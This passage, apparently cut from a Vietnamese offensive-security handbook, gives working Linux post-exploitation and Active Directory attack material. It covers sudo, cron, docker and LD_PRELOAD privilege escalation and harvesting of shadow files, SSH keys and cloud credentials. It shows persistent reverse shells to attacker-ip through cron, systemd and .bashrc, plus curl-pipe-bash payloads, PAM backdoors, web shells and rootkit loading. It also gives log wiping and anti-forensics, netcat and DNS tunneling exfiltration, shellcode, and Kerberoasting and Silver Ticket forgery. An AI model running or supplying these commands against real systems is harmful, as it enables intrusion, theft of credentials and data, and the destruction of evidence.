Sudo cho phép người dùng chạy lệnh với quyền của người dùng khác, thường là root.

```bash
# Kiểm tra quyền sudo
sudo -l

# Khai thác sudo misconfigurations
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec /bin/sh \;
sudo nano        # ^R^X reset; sh -p
sudo vim -c '!sh'
sudo less        # !sh
sudo man man     # !sh
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'

# Kiểm tra CVE-2019-14287 (Sudo < 1.8.28)
sudo -u#-1 /bin/bash

# Kiểm tra CVE-2021-3156 (Sudo < 1.9.5p2)
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

### 5.2.3. Capabilities

Capabilities là một tính năng trong Linux cho phép cấp quyền đặc biệt cho các tệp thực thi mà không cần sử dụng SUID.

```bash
# Liệt kê các tệp có capabilities
getcap -r / 2>/dev/null

# Khai thác capabilities phổ biến
# cap_setuid+ep
./binary with cap_setuid -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search+ep
./binary with cap_dac_read_search -c 'open("/etc/shadow").read()'
```

### 5.2.4. Cron Jobs

Các cron job được lập lịch chạy tự động và thường chạy với quyền của người dùng tạo chúng.

```bash
# Kiểm tra cron jobs
cat /etc/crontab
ls -la /etc/cron*
ls -la /var/spool/cron/crontabs

# Tìm kiếm các cron jobs đang chạy
ps aux | grep cron

# Khai thác writable cron jobs
echo '#!/bin/bash' > /path/to/cronjob
echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /path/to/cronjob
chmod +x /path/to/cronjob

# Tạo reverse shell qua cron wildcards
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/shell.sh
chmod +x /path/to/shell.sh
touch /path/to/--checkpoint=1
touch /path/to/--checkpoint-action=exec=sh\ shell.sh
```

### 5.2.5. NFS Shares

NFS (Network File System) có thể được cấu hình với tùy chọn no_root_squash, cho phép kẻ tấn công tạo ra tệp SUID.

```bash
# Kiểm tra các NFS share
cat /etc/exports
showmount -e localhost

# Khai thác NFS với no_root_squash
# Trên máy của bạn:
sudo mount -t nfs victim-ip:/shared /mnt
cd /mnt
sudo cp /bin/bash .
sudo chmod +s bash
# Trên máy nạn nhân:
/shared/bash -p
```

### 5.2.6. Kernel Exploits

Lỗ hổng kernel là vector leo thang quyền mạnh mẽ nhưng có thể gây ra sự không ổn định.

```bash
# Kiểm tra phiên bản kernel
uname -a
cat /proc/version

# Tìm kiếm exploits
searchsploit linux kernel $(uname -r)

# Các kernel exploits phổ biến
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 < 3.9
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# CVE-2021-4034 (PwnKit) - Polkit pkexec
./exploit

# CVE-2021-3493 - Ubuntu OverlayFS
./exploit
```

### 5.2.7. Docker Breakout

Nếu bạn là thành viên của nhóm docker, bạn có thể leo thang lên quyền root.

```bash
# Kiểm tra thành viên nhóm docker
id | grep docker

# Khai thác quyền docker
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

# Hoặc
docker run -it -v /:/host ubuntu chroot /host bash
```

### 5.2.8. Path Variable Abuse

Lạm dụng biến PATH để thực thi mã độc hại thay vì lệnh hợp pháp.

```bash
# Kiểm tra biến PATH
echo $PATH

# Tìm kiếm chương trình có thể khai thác
find / -type f -perm -u=s -ls 2>/dev/null

# Khai thác PATH
echo '#!/bin/sh' > /tmp/service
echo 'cp /bin/bash /tmp/rootbash' >> /tmp/service
echo 'chmod +s /tmp/rootbash' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/path/to/vulnerable/program
/tmp/rootbash -p
```

### 5.2.9. LD_PRELOAD Abuse

Nếu sudo được cấu hình với env_keep += LD_PRELOAD, bạn có thể sử dụng nó để leo thang đặc quyền.

```bash
# Kiểm tra nếu LD_PRELOAD được bảo toàn
sudo -l | grep LD_PRELOAD

# Tạo và biên dịch shared object
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

# Sử dụng LD_PRELOAD
sudo LD_PRELOAD=/tmp/preload.so find
```

## 5.3. Credential Access

Truy cập thông tin đăng nhập là quá trình tìm kiếm và thu thập mật khẩu và thông tin xác thực trong hệ thống đã xâm nhập.

### 5.3.1. Password Files

```bash
# Kiểm tra /etc/shadow
cat /etc/shadow

# Kiểm tra các tệp tin sao lưu
cat /etc/shadow-
cat /etc/shadow.bak
cat /etc/passwd.bak
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null | xargs cat 2>/dev/null | grep -E "password|pass|pwd"

# Tìm kiếm mật khẩu trong tệp tin
grep -r "password" /etc/ 2>/dev/null
grep -r "PASSWORD" /etc/ 2>/dev/null
```

### 5.3.2. Stored Credentials

```bash
# Kiểm tra các tệp lịch sử lệnh
cat ~/.bash_history
cat ~/.nano_history
cat ~/.mysql_history

# Kiểm tra các tệp cấu hình
cat ~/.ssh/id_rsa
cat ~/.ssh/config
cat ~/.aws/credentials

# Kiểm tra các tệp tin cấu hình ứng dụng web
find /var/www -type f -name "config*" | xargs grep -l "password" 2>/dev/null
find /var/www -regex ".*\.\(php\|inc\|conf\|config\)" | xargs grep -l "password" 2>/dev/null

# Kiểm tra các tệp cấu hình cơ sở dữ liệu
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
```

### 5.3.3. Memory Dumps and Password Sniffing

```bash
# Dump bộ nhớ của một tiến trình
gcore PID
strings memory.dump | grep -i pass

# Sử dụng mimipenguin (Mimikatz cho Linux)
sudo python mimipenguin.py

# Sử dụng tất cả các kỹ thuật của LaZagne
sudo laZagne.py all
```

### 5.3.4. SSH Keys and Agent Hijacking

```bash
# Tìm kiếm SSH keys
find / -name "id_rsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null

# Kiểm tra SSH agent
echo $SSH_AUTH_SOCK
ls -la $SSH_AUTH_SOCK

# Khai thác SSH agent forwarding
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh user@target
```

### 5.3.5. Browser Data

```bash
# Firefox profiles - Tìm kiếm logins.json và key4.db
find / -name "logins.json" 2>/dev/null
find / -name "key4.db" 2>/dev/null

# Chrome/Chromium
find / -name "Login Data" 2>/dev/null
find / -path "*/.config/google-chrome*" 2>/dev/null
```

### 5.3.6. Database Credentials

```bash
# MySQL
cat /etc/mysql/my.cnf
mysql -u root -p

# PostgreSQL
cat ~/.pgpass
psql -U postgres -W
```

### 5.3.7. Unsecured Files

```bash
# Tìm kiếm các tệp tin chứa thông tin đăng nhập
grep -r "password" --include="*.php" /var/www/ 2>/dev/null
grep -r "password" --include="*.conf" /etc/ 2>/dev/null
grep -r "password" --include="*.xml" / 2>/dev/null

# Tìm kiếm các tệp tin chứa mật khẩu
find / -type f -exec grep -l "password" {} \; 2>/dev/null
```

## 5.4. Persistence Techniques

Persistence (duy trì quyền truy cập) là quá trình thiết lập các cơ chế để đảm bảo rằng kẻ tấn công có thể duy trì quyền truy cập vào hệ thống ngay cả sau khi khởi động lại hoặc thay đổi mật khẩu.

### 5.4.1. SSH Backdoors

```bash
# Thêm SSH key
echo "ssh-rsa AAAAB3NzaC1yc2EAAAA..." >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAA..." >> /home/user/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAA..." >> /root/.ssh/authorized_keys

# Tạo user .ssh directory nếu chưa tồn tại
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Sửa đổi SSH config để ẩn login
echo "Match User victim" >> /etc/ssh/sshd_config
echo "    PermitEmptyPasswords yes" >> /etc/ssh/sshd_config
```

### 5.4.2. Creating Users

```bash
# Tạo người dùng mới với quyền root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash hacker
echo "hacker:password" | chpasswd

# Thêm người dùng vào nhóm sudo
usermod -aG sudo hacker
echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

### 5.4.3. Cron Jobs

```bash
# Thêm cron job cho reverse shell
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'" >> /etc/crontab

# Hoặc dạng ẩn hơn
echo "* * * * * root curl -s http://attacker-ip/shell.sh | bash" >> /etc/crontab
```

### 5.4.4. Rootkits and Kernel Modules

```bash
# Biên dịch và cài đặt kernel module
make
insmod ./rootkit.ko

# Cài đặt để tự động tải khi khởi động
cp ./rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/
echo 'rootkit' >> /etc/modules
depmod -a
```

### 5.4.5. Init Scripts and Systemd Services

```bash
# Tạo systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt service
systemctl enable backdoor.service
systemctl start backdoor.service

# Hoặc sử dụng init scripts (SysVinit)
cat > /etc/init.d/backdoor << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          backdoor
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Backdoor service
### END INIT INFO

bash -i >& /dev/tcp/attacker-ip/4444 0>&1
EOF

chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults
```

### 5.4.6. PAM Backdoors

```bash
# Tạo PAM module độc hại
cat > backdoor.c << EOF
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdlib.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    pam_get_user(pamh, &username, NULL);
    if (strcmp(username, "legituser") == 0) {
        return PAM_SUCCESS;
    }
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_sm_authenticate(pamh, flags, argc, argv);
}
EOF

gcc -shared -fPIC -o backdoor.so backdoor.c

# Cài đặt PAM module
cp backdoor.so /lib/security/
echo "auth sufficient backdoor.so" >> /etc/pam.d/common-auth
```

### 5.4.7. Web Shells

```bash
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# JSP web shell
echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > /var/www/html/shell.jsp

# ASP.NET web shell
echo '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">void Page_Load(object sender, EventArgs e){Process p = new Process();p.StartInfo.FileName = "cmd.exe";p.StartInfo.Arguments = "/c " + Request["cmd"];p.StartInfo.UseShellExecute = false;p.StartInfo.RedirectStandardOutput = true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}</script>' > /var/www/html/shell.aspx
```

### 5.4.8. .bashrc and Profile Backdoors

```bash
# Thêm backdoor vào .bashrc
echo 'nohup bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" &' >> ~/.bashrc

# Hoặc các tệp system-wide
echo 'nohup bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" &' >> /etc/profile
```

### 5.4.9. Process Injection and Library Hijacking

```bash
# Tạo shared library độc hại
cat > evil.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__ ((constructor)) evil() {
    system("bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'");
}
EOF

gcc -shared -fPIC -o evil.so evil.c

# Sử dụng LD_PRELOAD để tải
echo "LD_PRELOAD=/path/to/evil.so" >> /etc/environment
```

### 5.4.10. Login Hook

```bash
# Thêm hook vào login
echo "session optional pam_exec.so seteuid /path/to/backdoor.sh" >> /etc/pam.d/login
```

## 5.5. Data Exfiltration

Data Exfiltration (rò rỉ dữ liệu) là quá trình trích xuất dữ liệu nhạy cảm từ hệ thống đã xâm nhập.

### 5.5.1. Basic Data Transfer

```bash
# SCP (cần quyền truy cập SSH)
scp /path/to/file user@attacker-ip:/path/to/destination

# Netcat
# Trên máy attacker
nc -lvp 4444 > file.out
# Trên máy nạn nhân
nc attacker-ip 4444 < /path/to/file

# Base64 encoding và decoding
cat /path/to/file | base64
# Copy output và decode trên máy attacker
echo "base64_string" | base64 -d > file

# Sử dụng HTTP
python -m SimpleHTTPServer 8000
# Sau đó truy cập từ máy attacker: http://victim-ip:8000/
```

### 5.5.2. Encrypted Data Transfer

```bash
# OpenSSL encryption
openssl enc -aes-256-cbc -salt -in /path/to/file -out /tmp/file.enc -k password
# Sau đó chuyển file.enc và decrypt
openssl enc -aes-256-cbc -d -salt -in file.enc -out file.dec -k password

# GPG encryption
gpg -c /path/to/file
# Sau đó chuyển file.gpg và decrypt
gpg file.gpg
```

### 5.5.3. DNS Tunneling

```bash
# Sử dụng dnscat2
# Trên máy attacker
ruby dnscat2.rb domain.com
# Trên máy nạn nhân
./dnscat2 domain.com

# Iodine
# Trên máy attacker
iodined -f -c -P password 10.0.0.1 domain.com
# Trên máy nạn nhân
iodine -f -P password domain.com
```

### 5.5.4. ICMP Tunneling

```bash
# Sử dụng ptunnel
# Trên máy attacker
ptunnel -p victim-ip -lp 8000 -da attacker-ip -dp 22
# Sau đó kết nối SSH qua tunnel: ssh user@localhost -p 8000
```

### 5.5.5. Data Compression and Chunking

```bash
# Tạo archive và chia nhỏ
tar czf - /path/to/directory | split -b 1M - archive.tar.gz.
# Sau đó chuyển các phần và ghép lại
cat archive.tar.gz.* > archive.tar.gz
tar xzf archive.tar.gz
```

### 5.5.6. Steganography

```bash
# Ẩn dữ liệu trong ảnh
steghide embed -cf cover.jpg -ef secret.txt -p password
# Trích xuất dữ liệu
steghide extract -sf cover.jpg -p password
```

## 5.6. Covering Tracks

Covering Tracks (xóa dấu vết) là quá trình xóa bỏ các bằng chứng về hoạt động xâm nhập trên hệ thống mục tiêu.

### 5.6.1. Log Manipulation

```bash
# Xóa nhật ký đăng nhập
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/secure

# Xóa nhật ký bash
echo > ~/.bash_history
history -c

# Đặt thuộc tính không ghi nhật ký
export HISTSIZE=0
unset HISTFILE
```

### 5.6.2. Timestamp Manipulation

```bash
# Sửa đổi timestamp của file
touch -r /etc/passwd /path/to/your/file
```

### 5.6.3. Rootkit Detection Evasion

```bash
# Kiểm tra các công cụ phát hiện rootkit
dpkg -l | grep -i chkrootkit
dpkg -l | grep -i rkhunter

# Xóa các tệp rootkit sau khi sử dụng
rm -rf /tmp/rootkit*
```

### 5.6.4. Process Hiding

```bash
# Ẩn process sử dụng rootkit
kill -31 PID
```

### 5.6.5. Network Evidence Cleanup

```bash
# Xóa nhật ký iptables
iptables -Z
```

## 5.7. Lateral Movement

Lateral Movement (di chuyển ngang) là quá trình di chuyển giữa các hệ thống khác nhau trong mạng sau khi đã có được quyền truy cập ban đầu vào một hệ thống. Mục tiêu là mở rộng phạm vi truy cập và tìm kiếm các tài nguyên có giá trị cao hơn.

### 5.7.1. SSH Techniques

```bash
# Sử dụng SSH key đã tìm thấy
ssh -i id_rsa user@target-ip

# SSH Agent Forwarding
ssh -A user@pivot-host
# Từ pivot-host
ssh user@final-target

# ProxyJump (SSH 7.3+)
ssh -J user@pivot-host user@final-target

# Dynamic Port Forwarding (SOCKS proxy)
ssh -D 1080 user@pivot-host
# Cấu hình proxychains: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn target-ip

# Local Port Forwarding
ssh -L 8080:internal-server:80 user@pivot-host
# Truy cập http://localhost:8080

# Remote Port Forwarding
ssh -R 8080:localhost:80 user@attacker-ip
# Trên máy attacker: http://localhost:8080
```

### 5.7.2. Using Shared Credentials

```bash
# Sử dụng cùng password cho nhiều tài khoản
for ip in $(cat ips.txt); do
    sshpass -p "password123" ssh user@$ip "command"
done

# Sử dụng SSH key đã tìm thấy đối với nhiều máy
for ip in $(cat ips.txt); do
    ssh -i id_rsa user@$ip "command"
done
```

### 5.7.3. Internal Scanning

```bash
# Quét mạng nội bộ
nmap -sn 10.0.0.0/24

# Quét ports của các hosts phát hiện được
for ip in $(cat live_hosts.txt); do
    nmap -sT -Pn -p 22,80,443,3389,8080 $ip
done

# Sử dụng proxychains
proxychains nmap -sT -Pn 10.0.1.0/24
```

### 5.7.4. Tunneling and Pivoting

```bash
# Sử dụng socat
# Local port forwarding
socat TCP-LISTEN:8080,fork TCP:internal-server:80

# Sử dụng chisel 
# Server (attacker)
./chisel server -p 8080 --reverse
# Client (victim)
./chisel client attacker-ip:8080 R:socks

# Sử dụng sshuttle (VPN-like)
sshuttle -r user@pivot-host 10.0.0.0/24
```

### 5.7.5. File Transfers for Pivoting

```bash
# SCP thông qua pivot
scp -o "ProxyJump=user@pivot-host" file.txt user@final-target:/tmp/

# Sử dụng netcat qua pivot
# Trên final-target
nc -lvp 8080 > file.txt
# Trên pivot-host
nc final-target 8080 < file.txt

# Truyền file dạng staged
# Tạo web server trên attacker
python -m SimpleHTTPServer 8000
# Trên pivot
wget http://attacker-ip:8000/file.txt
python -m SimpleHTTPServer 8000
# Trên final-target
wget http://pivot-ip:8000/file.txt
```

## 5.8. Anti-Forensics Techniques

Anti-Forensics là các kỹ thuật nhằm gây khó khăn cho việc phân tích pháp y sau khi hệ thống bị xâm nhập.

### 5.8.1. Secure File Deletion

```bash
# Ghi đè lên file với dữ liệu ngẫu nhiên trước khi xóa
shred -zvu -n 10 file.txt

# Xóa thư mục và nội dung của nó
find /path/to/directory -type f -exec shred -zvu -n 10 {} \;
rm -rf /path/to/directory

# Xóa các temp files
find /tmp -type f -user $(whoami) -exec shred -zvu -n 3 {} \; 2>/dev/null
```

### 5.8.2. Memory Cleaning

```bash
# Giải phóng page cache, dentries và inodes
echo 3 > /proc/sys/vm/drop_caches

# Xóa swap
swapoff -a && swapon -a
```

### 5.8.3. Artifacts Removal

```bash
# Xóa lịch sử bash
cat /dev/null > ~/.bash_history && history -c

# Xóa các log files
for log in $(find /var/log -type f); do
    echo > $log
done

# Xóa temp files
rm -rf /tmp/* /var/tmp/*

# Xóa các mail files để tránh thông báo hệ thống
rm /var/mail/*
```

### 5.8.4. Timestamp Manipulation

```bash
# Khôi phục timestamps ban đầu
touch -r /etc/passwd /path/to/file

# Đặt timestamp cụ thể
touch -d "2023-01-01 12:00:00" /path/to/file
```

### 5.8.5. Disabling Core Dumps

```bash
# Tắt core dumps
echo 0 > /proc/sys/kernel/core_pattern
ulimit -c 0
```

## 5.9. Network Persistence

Duy trì quyền truy cập vào mạng ngay cả khi hệ thống ban đầu không còn khả dụng.

### 5.9.1. Tunneling and C2 Frameworks

```bash
# Cài đặt và cấu hình reverse shell tự khởi động
echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1'" | crontab -

# Thiết lập proxychains trong cron
echo "*/10 * * * * /usr/bin/proxychains /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1'" | crontab -
```

### 5.9.2. SSH Authorized Keys

```bash
# Thêm SSH key vào tất cả các tài khoản có thể
for user in $(cut -d: -f1 /etc/passwd); do
    if [ -d "/home/$user" ]; then
        mkdir -p /home/$user/.ssh
        echo "ssh-rsa AAAAB3..." >> /home/$user/.ssh/authorized_keys
        chown -R $user:$user /home/$user/.ssh
        chmod 700 /home/$user/.ssh
        chmod 600 /home/$user/.ssh/authorized_keys
    fi
done

# Thêm vào root
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3..." >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

### 5.9.3. Hidden Services

```bash
# Tạo hidden service trên các cổng không thường dùng
nohup socat TCP-LISTEN:65432,fork TCP:localhost:22 &

# Cấu hình SSH trên cổng không chuẩn
echo "Port 65432" >> /etc/ssh/sshd_config
systemctl restart sshd
```

## 5.10. Building Custom Exploits

Trong một số trường hợp, bạn cần phải xây dựng các exploits tùy chỉnh dựa trên lỗ hổng phát hiện được trên hệ thống Linux.

### 5.10.1. Basic Buffer Overflow

```c
// simple-buffer-overflow.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Không kiểm tra kích thước
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}

/*
 * Biên dịch: gcc -fno-stack-protector -z execstack -o vuln simple-buffer-overflow.c
 * Khai thác: ./vuln $(python -c 'print "A"*80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 */
```

### 5.10.2. Format String Exploit

```c
// format-string.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[100];
    
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    strncpy(buffer, argv[1], sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';
    
    printf(buffer);  // Lỗi format string
    printf("\n");
    
    return 0;
}

/*
 * Biên dịch: gcc -o format format-string.c
 * Khai thác để xem stack: ./format "AAAA %x %x %x %x"
 * Khai thác để ghi đè: ./format $(python -c 'print "\xe0\x97\x04\x08" + "%x %x %x %x %n"')
 */
```

### 5.10.3. Shellcode Development

```c
// shellcode-test.c
#include <stdio.h>
#include <string.h>

// Shellcode executes /bin/sh
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode Length: %d\n", strlen(shellcode));
    
    // Cast shellcode to function pointer and execute
    int (*ret)() = (int(*)())shellcode;
    ret();
    
    return 0;
}

/*
 * Biên dịch: gcc -fno-stack-protector -z execstack -o shellcode-test shellcode-test.c
 * Chạy: ./shellcode-test
 */
```

### 5.10.4. Privilege Escalation Exploits

```c
// SUID-wrapper.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // Set effective UID to real UID to drop privileges temporarily
    setuid(geteuid());
    
    // Execute bash with privileges
    system("/bin/bash -p");
    
    return 0;
}

/*
 * Biên dịch: gcc -o suid-wrapper SUID-wrapper.c
 * Đặt SUID bit: chmod u+s suid-wrapper
 * Chạy: ./suid-wrapper
 */
```

### 5.10.5. Kernel Exploit Development

```c
// kernel-exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define VULNERABLE_IOCTL 0x1234

int main() {
    int fd;
    char buffer[1024];
    
    // Mở thiết bị
    fd = open("/dev/vulnerable", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    // Chuẩn bị buffer với malicious data
    memset(buffer, 'A', sizeof(buffer));
    
    // Gửi ioctl
    if (ioctl(fd, VULNERABLE_IOCTL, buffer) < 0) {
        perror("ioctl");
        close(fd);
        return 1;
    }
    
    // Kiểm tra nếu exploit thành công
    if (getuid() == 0) {
        printf("Exploit successful, spawning root shell\n");
        system("/bin/bash");
    } else {
        printf("Exploit failed\n");
    }
    
    close(fd);
    return 0;
}

/*
 * Biên dịch: gcc -o kernel-exploit kernel-exploit.c
 * Chạy: ./kernel-exploit
 */
```

## 5.11. Automated Post-Exploitation

Sử dụng các công cụ và frameworks tự động hóa để đơn giản hóa và tăng tốc quá trình post-exploitation.

### 5.11.1. Metasploit Post Modules

```bash
# Sử dụng với session Meterpreter
run post/linux/gather/enum_system
run post/linux/gather/enum_configs
run post/linux/gather/enum_network
run post/linux/gather/enum_protections
run post/linux/gather/hashdump

# Tự động tìm kiếm các lỗ hổng privilege escalation
run post/multi/recon/local_exploit_suggester
```

### 5.11.2. Empire and PowerShell Empire

```bash
# Sử dụng Empire Linux modules (ví dụ)
usemodule linux/privesc/linux_priv_checker
usemodule linux/collection/find_sensitive_files
usemodule linux/situational_awareness/network/get_ssh_keys
```

---

Phần 5:

# 6. Credential Attacks in AD

Credential Attacks trong môi trường Active Directory là các kỹ thuật nhằm thu thập hoặc sử dụng thông tin xác thực để truy cập trái phép vào hệ thống. Các phương pháp tấn công này tận dụng các thiết kế và cấu hình của Kerberos và NTLM - hai giao thức xác thực chính được sử dụng trong môi trường Windows.

## 6.1. Kerberoasting

Kerberoasting là kỹ thuật tấn công nhắm vào tài khoản dịch vụ (service accounts) có SPN (Service Principal Name) đăng ký trong Active Directory. Kỹ thuật này cho phép kẻ tấn công lấy được TGS (Ticket Granting Service) tickets, sau đó có thể crack offline để tìm ra password.

### Kịch bản tấn công Kerberoasting:

1. Kẻ tấn công yêu cầu TGS ticket cho một service account
2. Domain Controller trả về ticket được mã hóa bằng hash NT của service account
3. Kẻ tấn công tách hash từ ticket và thực hiện brute force offline

### Kerberoasting với PowerShell:

```powershell
# Sử dụng PowerView để tìm user accounts với SPNs
Import-Module .\PowerView.ps1
Get-DomainUser -SPN

# Yêu cầu và trích xuất TGS
$User = Get-DomainUser -Identity sqlservice
Request-SPNTicket -SPN "MSSQLSvc/sqlserver.corp.local:1433"

# Sử dụng Empire's Invoke-Kerberoast
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat HashCat | % { $_.Hash } | Out-File -Encoding ASCII hashes.txt
```

### Kerberoasting với Impacket:

```bash
# Liệt kê và lấy TGS một lần
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 corp.local/username:password

# Lấy TGS cho một SPN cụ thể
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 -target-domain corp.local corp.local/username:password
```

### Kerberoasting với Rubeus:

```powershell
# Cơ bản
.\Rubeus.exe kerberoast

# Lưu vào file để crack
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Nhắm vào user cụ thể
.\Rubeus.exe kerberoast /user:sqlservice

# Format hashcat
.\Rubeus.exe kerberoast /format:hashcat
```

### Cracking Kerberoast Hashes:

```bash
# Sử dụng Hashcat (mode 13100)
hashcat -m 13100 -a 0 hashes.txt wordlist.txt --force

# Với rule
hashcat -m 13100 -a 0 hashes.txt wordlist.txt -r rules/best64.rule --force
```

## 6.2. AS-REP Roasting

AS-REP Roasting tấn công tài khoản có tùy chọn "Do not require Kerberos preauthentication" được bật. Việc này cho phép kẻ tấn công yêu cầu một AS-REP ticket mà không cần cung cấp thông tin xác thực, sau đó hash có thể bị crack offline.

### Tìm và khai thác tài khoản AS-REP Roasting:

```powershell
# Tìm kiếm tài khoản với PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired

# Sử dụng ASREPRoast script
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1')
Get-ASREPHash -UserName victim

# Tất cả tài khoản có thuộc tính DONT_REQ_PREAUTH
Invoke-ASREPRoast | Out-File -Encoding ASCII asrep_hashes.txt
```

### Sử dụng Impacket:

```bash
# Với thông tin đăng nhập
impacket-GetNPUsers -dc-ip 192.168.1.10 -request corp.local/username:password

# Không cần thông tin đăng nhập
impacket-GetNPUsers -dc-ip 192.168.1.10 -request -usersfile users.txt corp.local/
```

### Sử dụng Rubeus:

```powershell
# Lấy AS-REP hash
.\Rubeus.exe asreproast

# Format cho hashcat
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### Cracking AS-REP Hashes:

```bash
# Sử dụng Hashcat (mode 18200)
hashcat -m 18200 -a 0 asrep.txt wordlist.txt --force
```

## 6.3. Silver Ticket

Silver Ticket là kỹ thuật tạo TGS ticket giả mạo bằng cách sử dụng hash NT hoặc AES key của tài khoản dịch vụ (service account). Điều này cho phép kẻ tấn công tạo ticket giả để truy cập vào dịch vụ cụ thể mà không cần liên hệ với DC.

### Cách tạo Silver Ticket với Mimikatz:

```powershell
# Cấu trúc lệnh
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /service:service_type /target:server.corp.local /rc4:service_account_hash /user:fake_user /ptt

# Ví dụ Silver Ticket cho CIFS
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /service:cifs /target:fileserver.corp.local /rc4:5FD39431512C13D4A36264626D1F3129 /user:Administrator /ptt

# Ví dụ Silver Ticket cho MSSQL
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /service:MSSQLSvc /target:sqlserver.corp.local:1433 /rc4:5FD39431512C13D4A36264626D1F3129 /user:sa /ptt
```

### Sử dụng Impacket để tạo Silver Ticket:

```bash
# Sử dụng ticketer.py
impacket-ticketer -nthash service_account_hash -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -spn cifs/fileserver.corp.local fake_user

# Sử dụng ticket
export KRB5CCNAME=fake_user.ccache
impacket-smbexec -k -no-pass fileserver.corp.local
```

### Sử dụng Silver Ticket:

```powershell
# Sử dụng ticket đã inject với Pass-the-Ticket
ls \\fileserver.corp.local\share

# Kết nối với SQL Server
